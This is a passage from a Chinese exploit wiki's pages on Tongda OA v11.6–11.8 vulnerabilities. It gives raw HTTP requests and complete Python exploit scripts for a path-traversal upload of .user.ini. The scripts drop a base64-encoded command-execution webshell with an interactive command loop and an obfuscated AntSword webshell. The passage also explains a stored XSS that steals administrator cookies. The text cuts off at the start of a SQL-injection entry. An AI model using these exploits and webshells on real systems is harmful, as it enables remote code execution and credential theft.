_(\"原因：附件文件为空或文件名太长，或附件大于30兆字节，或文件路径不存在！\")); Button_Back(); exit(); } } 在这里参数 $USER_ID 是可控的，并且无过滤危险符号就拼接进去了，那我们传入 ../../../ 我们就可以任意文件上传了 由于通达OA 的文件上传限制的死死的，所以我们可以通过利用 PHP的 .user.ini 文件来包含其他文件，这里是可以用于包含PHP语句的文件的，所以我们上传文件内容为 auto_prepend_file=peiqi.log 请求包为 POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" 提交 -----------------------------17518323986548992951984057104-- 其中 USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user 为上传路径 关于更多原理参考 http://wiki.peiqi.tech 中的另一篇 通达OA v11.8 后台文件包含存储型XSS漏洞 这里我们简单知道了上传方式，那我们就通过 .user.ini文件 包含恶意文件 现在已经成功上传了恶意文件 访问 http://xxx.xxx.xxx.xxx/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=ipconfig 文件包含命令执行 [!NOTE] 在 v11.6中 上传的位置并没有限定所以可以上传在方便访问的目录(不需要登录) 而 v11.8中则有目录名的限制需要目录带有 webroot 和 attachment 漏洞利用POC [!NOTE] 脚本在 v11.6 测试成功执行， 在 v11.6以上执行时 这个webshell无法执行命令 v11.7 v11.8可用蚁剑插件绕过连接webshell import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 通达OA >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传.user.ini文件, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传.user.ini文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwCmVjaG8gIlBlaVFpX1dpa2kiOwokY29tbWFuZD0kX0dFVFsncGVpcWknXTsKJHdzaCA9IG5ldyBDT00oJ1dTY3JpcHQuc2hlbGwnKTsKJGV4ZWMgPSAkd3NoLT5leGVjKCJjbWQgL2MgIi4kY29tbWFuZCk7CiRzdGRvdXQgPSAkZXhlYy0+U3RkT3V0KCk7CiRzdHJvdXRwdXQgPSAkc3Rkb3V0LT5SZWFkQWxsKCk7CmVjaG8gJHN0cm91dHB1dDsKPz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传 peiqi.log 文件, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传 peiqi.log 文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=dir\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi \\033[0m\".format(target_url)) if \"PeiQi_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 存在漏洞，响应中包含 PeiQi_Wiki,存在漏洞,执行dir \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:{} \\033[0m\".format(response.text)) while True: cmd = str(input(\"\\033[36mCmd >>> \\033[0m\")) POC_4(target_url, Cookie, cmd) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 PeiQi_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_4(target_url, Cookie, cmd): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi={}\".format(cmd) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 响应为:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Cookie = \"USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31\" POC_1(target_url, Cookie) [!NOTE] v11.8及以下可连接蚁剑生成的webshell控制,且生成后不需要管理员Cookie即可连接 import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 通达OA >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传.user.ini文件, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传.user.ini文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwIAplY2hvICJQZWlRaV9XaWtpIjsKJGZPZ1Q9Y3JlYXRlX2Z1bmN0aW9uKGJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoMTE0MTk1Lzk5Mykuc3RyX3JvdDEzKCdiJykuc3RyX3JvdDEzKCd6JykuY2hyKDcwOC02MDcpLGNocigweGM2MGUvMHgxZjYpLmJhc2U2NF9kZWNvZGUoJ2RnPT0nKS5zdHJfcm90MTMoJ24nKS5jaHIoMzkwLTI4MikuY2hyKDB4MWFlLTB4MTg2KS5jaHIoMHgzYWMtMHgzODgpLmNocigweGQ1NjEvMHgxZGIpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5iYXNlNjRfZGVjb2RlKCdiUT09JykuYmFzZTY0X2RlY29kZSgnWlE9PScpLnN0cl9yb3QxMygnKScpLmNocig3OTgtNzM5KSk7JGZPZ1QoYmFzZTY0X2RlY29kZSgnT1RNMk4nLidETTNPMCcuJ0JsZGtGJy4nc0tDUmYnLicnLnN0cl9yb3QxMygnSCcpLnN0cl9yb3QxMygnUicpLmNocig0MTM4Mi83MjYpLnN0cl9yb3QxMygnRycpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5iYXNlNjRfZGVjb2RlKCdSZz09Jykuc3RyX3JvdDEzKCdnJykuc3RyX3JvdDEzKCdEJykuYmFzZTY0X2RlY29kZSgnV2c9PScpLmNocigyMzc1MS8yNzMpLicnLidsUmFWMCcuJ3BPekk0Jy4nTURrek0nLidURTcnLicnKSk7Pz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0K\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传 peiqi.log 文件, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传 peiqi.log 文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033[0m\".format(target_url)) if \"PeiQi_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 存在漏洞，响应中包含 PeiQi_Wiki \\033[0m\".format(target_url)) print(\"\\033[32m[o] 成功上传蚁剑木马 密码为: PeiQi \\n[o] webshell路径: {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?\\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 PeiQi_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Cookie = \"PHPSESSID=ug4ip8ohugo61bmu399npplep5; USER_NAME_COOKIE=admin; OA_USER_ID=admin\" POC_1(target_url, Cookie) POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.8 文件包含XSS漏洞.html":{"url":"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.8 文件包含XSS漏洞.html","title":"通达OA v11.8 文件包含XSS漏洞","keywords":"","body":"通达OA v11.8 后台文件包含存储型XSS漏洞 漏洞描述 通达OA v11.8以下存在文件上传接口，可上传 .user.ini 文件包含有xss语句的文件，使管理员后台文件均包含XSS语句，被攻击者获取敏感信息 漏洞影响 [!NOTE] 通达OA 环境搭建 通达OA v11.6下载链接 下载完毕点击安装即可 漏洞复现 这里使用的环境为通达 v11.6版本，v11.6版本中的漏洞利用较好，在 v11.7 后续版本中规定了上传路径，导致XSS利用会比较困难 出现漏洞的文件为 webroot/general/hr/manage/staff_info/update.php \\r\\n\"; echo \"\\r\\n\\r\\n\"; $PHOTO_NAME0 = $_FILES[\"ATTACHMENT\"][\"name\"]; $ATTACHMENT = $_FILES[\"ATTACHMENT\"][\"tmp_name\"]; if ($PHOTO_NAME0 != \"\") { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\"; if (!file_exists($FULL_PATH)) { @mkdir($FULL_PATH, 448); } $PHOTO_NAME = $USER_ID . substr($PHOTO_NAME0, strrpos($PHOTO_NAME0, \".\")); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME; td_copy($ATTACHMENT, $FILENAME); if (file_exists($ATTACHMENT)) { unlink($ATTACHMENT); } if (!file_exists($FILENAME)) { Message(_(\"附件上传失败\"), _(\"原因：附件文件为空或文件名太长，或附件大于30兆字节，或文件路径不存在！\")); Button_Back(); exit(); } } 在这里参数 $USER_ID 是可控的，并且无过滤危险符号就拼接进去了，那我们传入 ../../../ 我们就可以任意文件上传了 由于通达OA 的文件上传限制的死死的，所以我们可以通过利用 PHP的 .user.ini 文件来包含其他文件，这里是可以用于包含XSS语句的文件的，所以我们上传文件 内容为 auto_prepend_file=peiqi.log 我们想要最大化利用可以上传在首页或者管理员 界面，利用自定义弹窗来渗透 这里对管理员页面 general 目录上传 请求包为 POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" 提交 -----------------------------17518323986548992951984057104-- 其中 USER_ID=../../general/.user 为上传路径 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log 这里拼接后上传就变成了 .user.ini 这里再上传 XSS文件 peiqi.log 被包含进去 上传后每次管理员登录后都会带着Cookie请求一次XSS平台 钓鱼什么的代码写在peiqi.log文件里就好啦 刚刚提到了 v11.7版本不方便利用，这是因为在后续版本加上了文件上传的规定路径 if ((strpos($source, \"webroot\") !== false) && (strpos($source, \"attachment\") === false)) { return false; } else { return true; } 路径中必须要包含 webroot 和 attachment 才可以上传 这里XSS的利用点有4个文件夹，其中最有几率XSS的为存储目录管理的文件夹 用同样的方法上传利用文件，每次当管理员设置时就会盗取Cookie 漏洞利用POC 因为是xss可能对目标有影响，所以这里POC在一个不常用目录探测是否存在漏洞 Cookie填写访问后台时的Cookie, 其中的base64解码更改 PeiQi_Wiki为 自己的XSS语句 v11.6及以下 攻击 /general 和 /general/system/attachment 目录较好 v11.6以上 攻击 /general/system/attachment 目录较好 import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 通达OA >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传.user.ini文件, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传.user.ini文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KClBlaVFpX1dpa2kKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传 peiqi.log 文件, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传 peiqi.log 文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi \\033[0m\".format(target_url)) if \"PeiQi_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 存在漏洞，响应中包含 PeiQi_Wiki,存在XSS漏洞, 可参考文章写的利用版本进一步攻击 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 PeiQi_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Cookie = \"USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31\" POC_1(target_url, Cookie) 参考文章 https://paper.seebug.org/1499/ POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.9 后台SQL注入漏洞.html":{"url":"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.9 后台SQL注入漏洞.html","title":"通达OA v11.9 后台SQL注入漏洞","keywords":"","body":"通达OA v11.9 后台SQL注入漏洞 漏洞描述 通达OA v11.9 